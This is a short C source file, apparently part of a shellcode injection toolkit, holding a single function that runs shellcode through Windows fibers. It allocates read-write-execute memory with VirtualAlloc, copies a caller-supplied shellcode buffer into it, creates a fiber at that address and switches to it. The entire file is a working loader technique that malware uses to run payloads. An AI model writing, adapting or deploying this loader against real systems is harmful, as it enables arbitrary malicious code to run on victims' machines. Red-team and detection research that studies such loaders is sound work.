

#include "ShellcodeInjection.h"




// Fiber injection
int ThreadToFiber(char shellcode[], int shellcode_size) {
    // switch thread to fiber
    PVOID Fiber = ConvertThreadToFiber(NULL);

    // allocate shellcode space
    PVOID ShellcodeLocation = VirtualAlloc(0, shellcode_size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    memcpy(ShellcodeLocation, shellcode, shellcode_size);


    // create fiber with shellcode
    PVOID FiberWithShellcode = CreateFiber(NULL, (LPFIBER_START_ROUTINE)ShellcodeLocation, NULL);

    // run shellcode in fiber
    SwitchToFiber(FiberWithShellcode);


    return 0;
}
